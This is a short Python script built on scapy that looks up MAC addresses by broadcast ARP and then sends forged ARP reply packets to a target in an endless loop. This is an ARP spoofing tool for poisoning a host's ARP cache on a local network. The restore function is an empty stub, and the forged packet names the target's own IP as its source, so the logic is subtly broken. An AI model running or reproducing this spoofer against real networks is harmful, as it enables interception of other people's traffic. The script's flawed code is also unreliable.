from scapy.all import Ether,ARP,sendp,srp
from time import sleep
from colorama import Fore,Style

red=Fore.RED
blue=Fore.BLUE
bright=Style.BRIGHT
white=Fore.WHITE
reset=Style.RESET_ALL


def get_mac_addr(ip):
        # Function to get mac address from given ip.
    try:
        ether_frame=Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet=ARP(pdst=ip)
        sent_packet=ether_frame/arp_packet
        answer,unanswer=srp(sent_packet,verbose=False)
        return answer[0].answer.src
    
    except IndexError:
        print(f"{bright}{blue}INFO:{reset}Ip isn't reachable.")
        return 1
    
    except Exception as e:
        print(f"{bright}{blue}INFO:{reset}Unexpected Mac Error:{e}")
    
def spoof_restorer(src_ip,src_mac,dest_ip,dest_mac):
    # Funtion to restore spoofed table into normal.
    pass
    
def arp_spoofer(target_ip,target_mac,interface):
    # Function to create spoofed replay packet creation.
    i=1
    while True:
        try:
            ether_frame=Ether(dst=target_mac)
            arp_rpacket=ARP(op=2,psrc=target_ip,pdst=target_ip,hwdst=target_mac)
            replay_packet=ether_frame / arp_rpacket
            sendp(replay_packet,iface=interface,verbose=False)
            print(f"sent {i} packet")
            i=i+1
            sleep(2)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"{bright}{blue}INFO:{reset}Unexpected Error:{e}")
            break